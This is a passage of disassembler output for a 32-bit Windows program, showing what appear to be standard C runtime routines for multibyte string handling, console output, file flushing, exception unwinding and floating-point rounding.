; ---------------------------------------------------------------------------

loc_41A957:                             ; CODE XREF: sub_41A8D6+54↑j
                push    esi
                mov     esi, [ebp+arg_4]
                cmp     esi, ebx
                jnz     short loc_41A98A
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                cmp     [ebp+var_4], bl
                jz      short loc_41A983
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41A983:                             ; CODE XREF: sub_41A8D6+A4↑j
                mov     eax, 7FFFFFFFh
                jmp     short loc_41A9C3
; ---------------------------------------------------------------------------

loc_41A98A:                             ; CODE XREF: sub_41A8D6+87↑j
                                        ; sub_41A8D6+14E↓j
                mov     eax, [ebp+arg_0]
                movzx   ax, byte ptr [eax]
                dec     [ebp+arg_8]
                inc     [ebp+arg_0]
                movzx   ecx, ax
                movzx   eax, cl
                test    byte ptr [eax+edi+1Dh], 4
                jz      short loc_41A9E5
                cmp     [ebp+arg_8], ebx
                jnz     short loc_41A9C8
                movzx   eax, byte ptr [esi]
                xor     ecx, ecx
                test    byte ptr [eax+edi+1Dh], 4
                jz      short loc_41AA14

loc_41A9B5:                             ; CODE XREF: sub_41A8D6+149↓j
                                        ; sub_41A8D6+154↓j
                cmp     [ebp+var_4], bl
                jz      short loc_41A9C1
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41A9C1:                             ; CODE XREF: sub_41A8D6+E2↑j
                xor     eax, eax

loc_41A9C3:                             ; CODE XREF: sub_41A8D6+B2↑j
                                        ; sub_41A8D6+15F↓j ...
                pop     esi

loc_41A9C4:                             ; CODE XREF: sub_41A8D6+3F↑j
                                        ; sub_41A8D6+4C↑j ...
                pop     edi

loc_41A9C5:                             ; CODE XREF: sub_41A8D6+12↑j
                pop     ebx
                leave
                retn
; ---------------------------------------------------------------------------

loc_41A9C8:                             ; CODE XREF: sub_41A8D6+D1↑j
                mov     eax, [ebp+arg_0]
                mov     al, [eax]
                cmp     al, bl
                jnz     short loc_41A9D5
                xor     ecx, ecx
                jmp     short loc_41A9E5
; ---------------------------------------------------------------------------

loc_41A9D5:                             ; CODE XREF: sub_41A8D6+F9↑j
                shl     ecx, 8
                movzx   ax, al
                or      cx, ax
                inc     [ebp+arg_0]
                movzx   ecx, cx

loc_41A9E5:                             ; CODE XREF: sub_41A8D6+CC↑j
                                        ; sub_41A8D6+FD↑j
                movzx   ax, byte ptr [esi]
                movzx   eax, ax
                movzx   edx, al
                inc     esi
                test    byte ptr [edx+edi+1Dh], 4
                jz      short loc_41AA17
                cmp     [ebp+arg_8], ebx
                jnz     short loc_41AA00

loc_41A9FC:                             ; CODE XREF: sub_41A8D6+131↓j
                xor     eax, eax
                jmp     short loc_41AA17
; ---------------------------------------------------------------------------

loc_41AA00:                             ; CODE XREF: sub_41A8D6+124↑j
                mov     dl, [esi]
                dec     [ebp+arg_8]
                cmp     dl, bl
                jz      short loc_41A9FC
                movzx   dx, dl
                shl     eax, 8
                or      ax, dx
                inc     esi

loc_41AA14:                             ; CODE XREF: sub_41A8D6+DD↑j
                movzx   eax, ax

loc_41AA17:                             ; CODE XREF: sub_41A8D6+11F↑j
                                        ; sub_41A8D6+128↑j
                cmp     ax, cx
                jnz     short loc_41AA2C
                cmp     cx, bx
                jz      short loc_41A9B5
                cmp     [ebp+arg_8], ebx
                jnz     loc_41A98A
                jmp     short loc_41A9B5
; ---------------------------------------------------------------------------

loc_41AA2C:                             ; CODE XREF: sub_41A8D6+144↑j
                sbb     eax, eax
                and     eax, 2
                dec     eax
                cmp     [ebp+var_4], bl
                jz      short loc_41A9C3
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh
                jmp     short loc_41A9C3
sub_41A8D6      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41AA40      proc near               ; CODE XREF: sub_41374F+1D8↑p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_41A8D6
                add     esp, 10h
                pop     ebp
                retn
sub_41AA40      endp

; ---------------------------------------------------------------------------
                align 4
                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                push    edi
                push    ebp
                push    0
                push    0
                push    offset loc_41AA74
                push    dword ptr [ebp+8]
                call    RtlUnwind

loc_41AA74:                             ; DATA XREF: .text:0041AA67↑o
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn

; =============== S U B R O U T I N E =======================================


sub_41AA7C      proc near               ; DATA XREF: sub_41AAC1+B↓o
                                        ; .text:0041AB4E↓o ...

arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_C           = dword ptr  10h
arg_10          = dword ptr  14h

                mov     ecx, [esp+arg_0]
                test    dword ptr [ecx+4], 6
                mov     eax, 1
                jz      short locret_41AAC0
                mov     eax, [esp+arg_10]
                mov     ecx, [eax-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                push    ebp
                mov     ebp, [eax+10h]
                mov     edx, [eax+28h]
                push    edx
                mov     edx, [eax+24h]
                push    edx
                call    sub_41AAC1
                add     esp, 8
                pop     ebp
                mov     eax, [esp+arg_4]
                mov     edx, [esp+arg_C]
                mov     [edx], eax
                mov     eax, 3

locret_41AAC0:                          ; CODE XREF: sub_41AA7C+10↑j
                retn
sub_41AA7C      endp


; =============== S U B R O U T I N E =======================================


sub_41AAC1      proc near               ; CODE XREF: sub_41AA7C+2C↑p

var_20          = dword ptr -20h
var_18          = dword ptr -18h
arg_0           = dword ptr  4
arg_4           = dword ptr  8

                push    ebx
                push    esi
                push    edi
                mov     eax, [esp+0Ch+arg_0]
                push    ebp
                push    eax
                push    0FFFFFFFEh
                push    offset sub_41AA7C
                push    large dword ptr fs:0
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+24h+var_20]
                mov     large fs:0, eax

loc_41AAEA:                             ; CODE XREF: sub_41AAC1:loc_41AB31↓j
                mov     eax, [esp+24h+arg_0]
                mov     ebx, [eax+8]
                mov     esi, [eax+0Ch]
                cmp     esi, 0FFFFFFFFh
                jz      short loc_41AB33
                cmp     [esp+24h+arg_4], 0FFFFFFFFh
                jz      short loc_41AB06
                cmp     esi, [esp+24h+arg_4]
                jbe     short loc_41AB33

loc_41AB06:                             ; CODE XREF: sub_41AAC1+3D↑j
                lea     esi, [esi+esi*2]
                mov     ecx, [ebx+esi*4]
                mov     [esp+24h+var_18], ecx
                mov     [eax+0Ch], ecx
                cmp     dword ptr [ebx+esi*4+4], 0
                jnz     short loc_41AB31
                push    101h
                mov     eax, [ebx+esi*4+8]
                call    sub_41AB71
                mov     eax, [ebx+esi*4+8]
                call    sub_41AB90

loc_41AB31:                             ; CODE XREF: sub_41AAC1+57↑j
                jmp     short loc_41AAEA
; ---------------------------------------------------------------------------

loc_41AB33:                             ; CODE XREF: sub_41AAC1+36↑j
                                        ; sub_41AAC1+43↑j
                mov     ecx, [esp+24h+var_20]
                mov     large fs:0, ecx
                add     esp, 18h
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_41AAC1      endp

; ---------------------------------------------------------------------------
                xor     eax, eax
                mov     ecx, large fs:0
                cmp     dword ptr [ecx+4], offset sub_41AA7C
                jnz     short locret_41AB67
                mov     edx, [ecx+0Ch]
                mov     edx, [edx+0Ch]
                cmp     [ecx+8], edx
                jnz     short locret_41AB67
                mov     eax, 1

locret_41AB67:                          ; CODE XREF: .text:0041AB55↑j
                                        ; .text:0041AB60↑j
                retn

; =============== S U B R O U T I N E =======================================


sub_41AB68      proc near               ; CODE XREF: sub_4188E0+1E↑p
                                        ; sub_4188E0+40↑p
                push    ebx
                push    ecx
                mov     ebx, offset unk_425F20
                jmp     short loc_41AB7C
sub_41AB68      endp


; =============== S U B R O U T I N E =======================================


sub_41AB71      proc near               ; CODE XREF: sub_413B50+6E↑p
                                        ; sub_413C59+8↑p ...

arg_0           = dword ptr  4

                push    ebx
                push    ecx
                mov     ebx, offset unk_425F20
                mov     ecx, [esp+8+arg_0]

loc_41AB7C:                             ; CODE XREF: sub_41AB68+7↑j
                mov     [ebx+8], ecx
                mov     [ebx+4], eax
                mov     [ebx+0Ch], ebp
                push    ebp
                push    ecx
                push    eax
                pop     eax
                pop     ecx
                pop     ebp
                pop     ecx
                pop     ebx
                retn    4
sub_41AB71      endp


; =============== S U B R O U T I N E =======================================


sub_41AB90      proc near               ; CODE XREF: sub_413B50+7B↑p
                                        ; sub_41AAC1+6B↑p
                call    eax
                retn
sub_41AB90      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41AB93(__int16 Buffer)
sub_41AB93      proc near               ; CODE XREF: sub_4148B5+31C↑p
                                        ; sub_4148B5+349↑p

NumberOfCharsWritten= dword ptr -10h
MultiByteStr    = byte ptr -0Ch
var_4           = dword ptr -4
Buffer          = word ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                push    esi
                xor     esi, esi
                cmp     dword_425F30, esi
                jz      short loc_41ABFF
                cmp     hConsoleOutput, 0FFFFFFFEh
                jnz     short loc_41ABBE
                call    sub_41CF17

loc_41ABBE:                             ; CODE XREF: sub_41AB93+24↑j
                mov     eax, hConsoleOutput
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_41ABCF

loc_41ABC8:                             ; CODE XREF: sub_41AB93+59↓j
                                        ; sub_41AB93+64↓j ...
                mov     eax, 0FFFFh
                jmp     short loc_41AC3F
; ---------------------------------------------------------------------------

loc_41ABCF:                             ; CODE XREF: sub_41AB93+33↑j
                push    esi             ; lpReserved
                lea     ecx, [ebp+NumberOfCharsWritten]
                push    ecx             ; lpNumberOfCharsWritten
                push    1               ; nNumberOfCharsToWrite
                lea     ecx, [ebp+Buffer]
                push    ecx             ; lpBuffer
                push    eax             ; hConsoleOutput
                call    ds:WriteConsoleW
                test    eax, eax
                jnz     short loc_41AC4C
                cmp     dword_425F30, 2
                jnz     short loc_41ABC8
                call    ds:GetLastError
                cmp     eax, 78h
                jnz     short loc_41ABC8
                mov     dword_425F30, esi

loc_41ABFF:                             ; CODE XREF: sub_41AB93+1B↑j
                push    esi             ; lpUsedDefaultChar
                push    esi             ; lpDefaultChar
                push    5               ; cbMultiByte
                lea     eax, [ebp+MultiByteStr]
                push    eax             ; lpMultiByteStr
                push    1               ; cchWideChar
                lea     eax, [ebp+Buffer]
                push    eax             ; lpWideCharStr
                push    esi             ; dwFlags
                call    ds:GetConsoleOutputCP
                push    eax             ; CodePage
                call    ds:WideCharToMultiByte
                mov     ecx, hConsoleOutput
                cmp     ecx, 0FFFFFFFFh
                jz      short loc_41ABC8
                push    esi             ; lpReserved
                lea     edx, [ebp+NumberOfCharsWritten]
                push    edx             ; lpNumberOfCharsWritten
                push    eax             ; nNumberOfCharsToWrite
                lea     eax, [ebp+MultiByteStr]
                push    eax             ; lpBuffer
                push    ecx             ; hConsoleOutput
                call    ds:WriteConsoleA
                test    eax, eax
                jz      short loc_41ABC8

loc_41AC3B:                             ; CODE XREF: sub_41AB93+C3↓j
                mov     ax, [ebp+Buffer]

loc_41AC3F:                             ; CODE XREF: sub_41AB93+3A↑j
                mov     ecx, [ebp+var_4]
                xor     ecx, ebp
                pop     esi
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
; ---------------------------------------------------------------------------

loc_41AC4C:                             ; CODE XREF: sub_41AB93+50↑j
                mov     dword_425F30, 1
                jmp     short loc_41AC3B
sub_41AB93      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41AC58(LPWSTR lpWideCharStr, LPCSTR lpMultiByteStr, int, int)
sub_41AC58      proc near               ; CODE XREF: sub_41AD6F+10↓p

var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
lpWideCharStr   = dword ptr  8
lpMultiByteStr  = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    ebx
                push    esi
                mov     esi, [ebp+lpMultiByteStr]
                xor     ebx, ebx
                cmp     esi, ebx
                jz      short loc_41AC80
                cmp     [ebp+arg_8], ebx
                jz      short loc_41AC80
                cmp     [esi], bl
                jnz     short loc_41AC86
                mov     eax, [ebp+lpWideCharStr]
                cmp     eax, ebx
                jz      short loc_41AC80
                xor     ecx, ecx
                mov     [eax], cx

loc_41AC80:                             ; CODE XREF: sub_41AC58+11↑j
                                        ; sub_41AC58+16↑j ...
                xor     eax, eax

loc_41AC82:                             ; CODE XREF: sub_41AC58+5E↓j
                                        ; sub_41AC58+BF↓j ...
                pop     esi
                pop     ebx
                leave
                retn
; ---------------------------------------------------------------------------

loc_41AC86:                             ; CODE XREF: sub_41AC58+1A↑j
                push    [ebp+arg_C]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                mov     eax, [ebp+var_10]
                cmp     [eax+14h], ebx
                jnz     short loc_41ACB8
                mov     eax, [ebp+lpWideCharStr]
                cmp     eax, ebx
                jz      short loc_41ACA7
                movzx   cx, byte ptr [esi]
                mov     [eax], cx

loc_41ACA7:                             ; CODE XREF: sub_41AC58+46↑j
                                        ; sub_41AC58+10F↓j
                cmp     [ebp+var_4], bl
                jz      short loc_41ACB3
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41ACB3:                             ; CODE XREF: sub_41AC58+52↑j
                xor     eax, eax
                inc     eax
                jmp     short loc_41AC82
; ---------------------------------------------------------------------------

loc_41ACB8:                             ; CODE XREF: sub_41AC58+3F↑j
                lea     eax, [ebp+var_10]
                push    eax
                movzx   eax, byte ptr [esi]
                push    eax
                call    sub_418D37
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_41AD48
                mov     eax, [ebp+var_10]
                mov     ecx, [eax+0ACh]
                cmp     ecx, 1
                jle     short loc_41ACFE
                cmp     [ebp+arg_8], ecx
                jl      short loc_41ACFE
                xor     edx, edx
                cmp     [ebp+lpWideCharStr], ebx
                setnz   dl
                push    edx             ; cchWideChar
                push    [ebp+lpWideCharStr] ; lpWideCharStr
                push    ecx             ; cbMultiByte
                push    esi             ; lpMultiByteStr
                push    9               ; dwFlags
                push    dword ptr [eax+4] ; CodePage
                call    ds:MultiByteToWideChar
                test    eax, eax
                mov     eax, [ebp+var_10]
                jnz     short loc_41AD0E

loc_41ACFE:                             ; CODE XREF: sub_41AC58+7F↑j
                                        ; sub_41AC58+84↑j
                mov     ecx, [ebp+arg_8]
                cmp     ecx, [eax+0ACh]
                jb      short loc_41AD29
                cmp     [esi+1], bl
                jz      short loc_41AD29

loc_41AD0E:                             ; CODE XREF: sub_41AC58+A4↑j
                mov     eax, [eax+0ACh]
                cmp     [ebp+var_4], bl
                jz      loc_41AC82
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh
                jmp     loc_41AC82
; ---------------------------------------------------------------------------

loc_41AD29:                             ; CODE XREF: sub_41AC58+AF↑j
                                        ; sub_41AC58+B4↑j ...
                call    sub_41090E
                mov     dword ptr [eax], 2Ah
                cmp     [ebp+var_4], bl
                jz      short loc_41AD40
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41AD40:                             ; CODE XREF: sub_41AC58+DF↑j
                or      eax, 0FFFFFFFFh
                jmp     loc_41AC82
; ---------------------------------------------------------------------------

loc_41AD48:                             ; CODE XREF: sub_41AC58+71↑j
                xor     eax, eax
                cmp     [ebp+lpWideCharStr], ebx
                setnz   al
                push    eax             ; cchWideChar
                push    [ebp+lpWideCharStr] ; lpWideCharStr
                mov     eax, [ebp+var_10]
                push    1               ; cbMultiByte
                push    esi             ; lpMultiByteStr
                push    9               ; dwFlags
                push    dword ptr [eax+4] ; CodePage
                call    ds:MultiByteToWideChar
                test    eax, eax
                jnz     loc_41ACA7
                jmp     short loc_41AD29
sub_41AC58      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41AD6F(LPWSTR lpWideCharStr, LPCSTR lpMultiByteStr, int)
sub_41AD6F      proc near               ; CODE XREF: sub_4148B5+1E1↑p
                                        ; sub_4148B5+205↑p

lpWideCharStr   = dword ptr  8
lpMultiByteStr  = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0               ; int
                push    [ebp+arg_8]     ; int
                push    [ebp+lpMultiByteStr] ; lpMultiByteStr
                push    [ebp+lpWideCharStr] ; lpWideCharStr
                call    sub_41AC58
                add     esp, 10h
                pop     ebp
                retn
sub_41AD6F      endp

; ---------------------------------------------------------------------------
                align 10h
; [0000002B BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41ADBB      proc near               ; CODE XREF: sub_41512C+36↑p

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8

                push    10h
                push    offset stru_423268
                call    __SEH_prolog4
                mov     eax, [ebp+arg_0]
                cmp     eax, 0FFFFFFFEh
                jnz     short loc_41ADE2
                call    sub_41090E
                mov     dword ptr [eax], 9

loc_41ADDA:                             ; CODE XREF: sub_41ADBB+4D↓j
                or      eax, 0FFFFFFFFh
                jmp     loc_41AE8C
; ---------------------------------------------------------------------------

loc_41ADE2:                             ; CODE XREF: sub_41ADBB+12↑j
                xor     ebx, ebx
                cmp     eax, ebx
                jl      short loc_41ADF0
                cmp     eax, uNumber
                jb      short loc_41AE0A

loc_41ADF0:                             ; CODE XREF: sub_41ADBB+2B↑j
                                        ; sub_41ADBB+6D↓j
                call    sub_41090E
                mov     dword ptr [eax], 9
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                call    sub_40EC54
                add     esp, 14h
                jmp     short loc_41ADDA
; ---------------------------------------------------------------------------

loc_41AE0A:                             ; CODE XREF: sub_41ADBB+33↑j
                mov     ecx, eax
                sar     ecx, 5
                lea     edi, dword_42CA00[ecx*4]
                mov     esi, eax
                and     esi, 1Fh
                shl     esi, 6
                mov     ecx, [edi]
                movsx   ecx, byte ptr [esi+ecx+4]
                and     ecx, 1
                jz      short loc_41ADF0
                push    eax
                call    sub_4162DD
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], ebx
                mov     eax, [edi]
                test    byte ptr [esi+eax+4], 1
                jz      short loc_41AE6E
                push    [ebp+arg_0]
                call    sub_416266
                pop     ecx
                push    eax             ; hFile
                call    ds:FlushFileBuffers
                test    eax, eax
                jnz     short loc_41AE5C
                call    ds:GetLastError
                mov     [ebp+var_1C], eax
                jmp     short loc_41AE5F
; ---------------------------------------------------------------------------

loc_41AE5C:                             ; CODE XREF: sub_41ADBB+94↑j
                mov     [ebp+var_1C], ebx

loc_41AE5F:                             ; CODE XREF: sub_41ADBB+9F↑j
                cmp     [ebp+var_1C], ebx
                jz      short loc_41AE7D
                call    sub_410921
                mov     ecx, [ebp+var_1C]
                mov     [eax], ecx

loc_41AE6E:                             ; CODE XREF: sub_41ADBB+80↑j
                call    sub_41090E
                mov     dword ptr [eax], 9
                or      [ebp+var_1C], 0FFFFFFFFh

loc_41AE7D:                             ; CODE XREF: sub_41ADBB+A7↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_41AE92
; ---------------------------------------------------------------------------

loc_41AE89:                             ; CODE XREF: sub_41ADBB+E0↓j
                mov     eax, [ebp+var_1C]

loc_41AE8C:                             ; CODE XREF: sub_41ADBB+22↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_41AE92:                             ; CODE XREF: sub_41ADBB+C9↑j
                                        ; DATA XREF: .rdata:stru_423268↓o
                push    [ebp+arg_0]
                call    sub_41637D
                pop     ecx
                retn
sub_41ADBB      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41AE9C      proc near               ; CODE XREF: sub_4155FC+57↑p
                                        ; sub_41CF9D+46↓p

var_2C          = byte ptr -2Ch
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 2Ch
                mov     eax, [ebp+arg_0]
                movzx   ecx, word ptr [eax+0Ah]
                push    ebx
                mov     ebx, ecx
                and     ecx, 8000h
                mov     [ebp+var_14], ecx
                mov     ecx, [eax+6]
                mov     [ebp+var_20], ecx
                mov     ecx, [eax+2]
                movzx   eax, word ptr [eax]
                and     ebx, 7FFFh
                sub     ebx, 3FFFh
                shl     eax, 10h
                push    edi
                mov     [ebp+var_1C], ecx
                mov     [ebp+var_18], eax
                cmp     ebx, 0FFFFC001h
                jnz     short loc_41AF08
                xor     ebx, ebx
                xor     eax, eax

loc_41AEE5:                             ; CODE XREF: sub_41AE9C+53↓j
                cmp     [ebp+eax*4+var_20], ebx
                jnz     short loc_41AEF8
                inc     eax
                cmp     eax, 3
                jl      short loc_41AEE5
                xor     eax, eax
                jmp     loc_41B39D
; ---------------------------------------------------------------------------

loc_41AEF8:                             ; CODE XREF: sub_41AE9C+4D↑j
                xor     eax, eax
                lea     edi, [ebp+var_20]
                stosd
                stosd
                push    2
                stosd
                pop     eax
                jmp     loc_41B39D
; ---------------------------------------------------------------------------

loc_41AF08:                             ; CODE XREF: sub_41AE9C+43↑j
                and     [ebp+arg_0], 0
                push    esi
                lea     esi, [ebp+var_20]
                lea     edi, [ebp+var_2C]
                movsd
                movsd
                movsd
                mov     esi, dword_425F48
                dec     esi
                lea     ecx, [esi+1]
                mov     eax, ecx
                cdq
                and     edx, 1Fh
                add     eax, edx
                sar     eax, 5
                mov     edx, ecx
                and     edx, 8000001Fh
                mov     [ebp+var_10], ebx
                mov     [ebp+var_C], eax
                jns     short loc_41AF40
                dec     edx
                or      edx, 0FFFFFFE0h
                inc     edx

loc_41AF40:                             ; CODE XREF: sub_41AE9C+9D↑j
                lea     edi, [ebp+eax*4+var_20]
                push    1Fh
                xor     eax, eax
                pop     ecx
                sub     ecx, edx
                inc     eax
                shl     eax, cl
                mov     [ebp+var_8], ecx
                test    [edi], eax
                jz      loc_41AFE6
                mov     eax, [ebp+var_C]
                or      edx, 0FFFFFFFFh
                shl     edx, cl
                not     edx
                test    [ebp+eax*4+var_20], edx
                jmp     short loc_41AF6E
; ---------------------------------------------------------------------------

loc_41AF69:                             ; CODE XREF: sub_41AE9C+D8↓j
                cmp     [ebp+eax*4+var_20], 0

loc_41AF6E:                             ; CODE XREF: sub_41AE9C+CB↑j
                jnz     short loc_41AF78
                inc     eax
                cmp     eax, 3
                jl      short loc_41AF69
                jmp     short loc_41AFE6
; ---------------------------------------------------------------------------

loc_41AF78:                             ; CODE XREF: sub_41AE9C:loc_41AF6E↑j
                mov     eax, esi
                cdq
                push    1Fh
                pop     ecx
                and     edx, ecx
                add     eax, edx
                sar     eax, 5
                and     esi, 8000001Fh
                jns     short loc_41AF92
                dec     esi
                or      esi, 0FFFFFFE0h
                inc     esi

loc_41AF92:                             ; CODE XREF: sub_41AE9C+EF↑j
                and     [ebp+var_4], 0
                sub     ecx, esi
                xor     edx, edx
                inc     edx
                shl     edx, cl
                lea     ecx, [ebp+eax*4+var_20]
                mov     esi, [ecx]
                add     esi, edx
                mov     [ebp+arg_0], esi
                mov     esi, [ecx]
                cmp     [ebp+arg_0], esi
                jb      short loc_41AFD1
                cmp     [ebp+arg_0], edx
                jmp     short loc_41AFCF
; ---------------------------------------------------------------------------

loc_41AFB4:                             ; CODE XREF: sub_41AE9C+145↓j
                test    ecx, ecx
                jz      short loc_41AFE3
                and     [ebp+var_4], 0
                lea     ecx, [ebp+eax*4+var_20]
                mov     edx, [ecx]
                lea     esi, [edx+1]
                mov     [ebp+arg_0], esi
                cmp     esi, edx
                jb      short loc_41AFD1
                cmp     esi, 1

loc_41AFCF:                             ; CODE XREF: sub_41AE9C+116↑j
                jnb     short loc_41AFD8

loc_41AFD1:                             ; CODE XREF: sub_41AE9C+111↑j
                                        ; sub_41AE9C+12E↑j
                mov     [ebp+var_4], 1

loc_41AFD8:                             ; CODE XREF: sub_41AE9C:loc_41AFCF↑j
                dec     eax
                mov     edx, [ebp+arg_0]
                mov     [ecx], edx
                mov     ecx, [ebp+var_4]
                jns     short loc_41AFB4

loc_41AFE3:                             ; CODE XREF: sub_41AE9C+11A↑j
                mov     [ebp+arg_0], ecx

loc_41AFE6:                             ; CODE XREF: sub_41AE9C+B7↑j
                                        ; sub_41AE9C+DA↑j
                mov     ecx, [ebp+var_8]
                or      eax, 0FFFFFFFFh
                shl     eax, cl
                and     [edi], eax
                mov     eax, [ebp+var_C]
                inc     eax
                cmp     eax, 3
                jge     short loc_41B006
                push    3
                pop     ecx
                lea     edi, [ebp+eax*4+var_20]
                sub     ecx, eax
                xor     eax, eax
                rep stosd

loc_41B006:                             ; CODE XREF: sub_41AE9C+15B↑j
                cmp     [ebp+arg_0], 0
                jz      short loc_41B00D
                inc     ebx

loc_41B00D:                             ; CODE XREF: sub_41AE9C+16E↑j
                mov     eax, dword_425F44
                mov     ecx, eax
                sub     ecx, dword_425F48
                cmp     ebx, ecx
                jge     short loc_41B02B
                xor     eax, eax
                lea     edi, [ebp+var_20]
                stosd
                stosd
                stosd
                jmp     loc_41B238
; ---------------------------------------------------------------------------

loc_41B02B:                             ; CODE XREF: sub_41AE9C+180↑j
                cmp     ebx, eax
                jg      loc_41B242
                sub     eax, [ebp+var_10]
                lea     esi, [ebp+var_2C]
                mov     ecx, eax
                lea     edi, [ebp+var_20]
                movsd
                cdq
                and     edx, 1Fh
                add     eax, edx
                movsd
                mov     edx, ecx
                sar     eax, 5
                and     edx, 8000001Fh
                movsd
                jns     short loc_41B059
                dec     edx
                or      edx, 0FFFFFFE0h
                inc     edx

loc_41B059:                             ; CODE XREF: sub_41AE9C+1B6↑j
                and     [ebp+var_C], 0
                and     [ebp+arg_0], 0
                or      edi, 0FFFFFFFFh
                mov     ecx, edx
                shl     edi, cl
                mov     [ebp+var_4], 20h
                sub     [ebp+var_4], edx
                not     edi

loc_41B074:                             ; CODE XREF: sub_41AE9C+203↓j
                mov     ebx, [ebp+arg_0]
                lea     ebx, [ebp+ebx*4+var_20]
                mov     esi, [ebx]
                mov     ecx, esi
                and     ecx, edi
                mov     [ebp+var_10], ecx
                mov     ecx, edx
                shr     esi, cl
                mov     ecx, [ebp+var_4]
                or      esi, [ebp+var_C]
                mov     [ebx], esi
                mov     esi, [ebp+var_10]
                shl     esi, cl
                inc     [ebp+arg_0]
                cmp     [ebp+arg_0], 3
                mov     [ebp+var_C], esi
                jl      short loc_41B074
                mov     esi, eax
                push    2
                shl     esi, 2
                lea     ecx, [ebp+var_18]
                pop     edx
                sub     ecx, esi

loc_41B0AE:                             ; CODE XREF: sub_41AE9C+229↓j
                cmp     edx, eax
                jl      short loc_41B0BA
                mov     esi, [ecx]
                mov     [ebp+edx*4+var_20], esi
                jmp     short loc_41B0BF
; ---------------------------------------------------------------------------

loc_41B0BA:                             ; CODE XREF: sub_41AE9C+214↑j
                and     [ebp+edx*4+var_20], 0

loc_41B0BF:                             ; CODE XREF: sub_41AE9C+21C↑j
                dec     edx
                sub     ecx, 4
                test    edx, edx
                jge     short loc_41B0AE
                mov     esi, dword_425F48
                dec     esi
                lea     ecx, [esi+1]
                mov     eax, ecx
                cdq
                and     edx, 1Fh
                add     eax, edx
                sar     eax, 5
                mov     edx, ecx
                and     edx, 8000001Fh
                mov     [ebp+var_C], eax
                jns     short loc_41B0EE
                dec     edx
                or      edx, 0FFFFFFE0h
                inc     edx

loc_41B0EE:                             ; CODE XREF: sub_41AE9C+24B↑j
                push    1Fh
                pop     ecx
                sub     ecx, edx
                xor     edx, edx
                inc     edx
                shl     edx, cl
                lea     ebx, [ebp+eax*4+var_20]
                mov     [ebp+var_10], ecx
                test    [ebx], edx
                jz      loc_41B189
                or      edx, 0FFFFFFFFh
                shl     edx, cl
                not     edx
                test    [ebp+eax*4+var_20], edx
                jmp     short loc_41B119
; ---------------------------------------------------------------------------

loc_41B114:                             ; CODE XREF: sub_41AE9C+283↓j
                cmp     [ebp+eax*4+var_20], 0

loc_41B119:                             ; CODE XREF: sub_41AE9C+276↑j
                jnz     short loc_41B123
                inc     eax
                cmp     eax, 3
                jl      short loc_41B114
                jmp     short loc_41B189
; ---------------------------------------------------------------------------

loc_41B123:                             ; CODE XREF: sub_41AE9C:loc_41B119↑j
                mov     eax, esi
                cdq
                push    1Fh
                pop     ecx
                and     edx, ecx
                add     eax, edx
                sar     eax, 5
                and     esi, 8000001Fh
                jns     short loc_41B13D
                dec     esi
                or      esi, 0FFFFFFE0h
                inc     esi

loc_41B13D:                             ; CODE XREF: sub_41AE9C+29A↑j
                and     [ebp+arg_0], 0
                xor     edx, edx
                sub     ecx, esi
                inc     edx
                shl     edx, cl
                lea     ecx, [ebp+eax*4+var_20]
                mov     esi, [ecx]
                lea     edi, [esi+edx]
                cmp     edi, esi
                jb      short loc_41B159
                cmp     edi, edx
                jnb     short loc_41B160

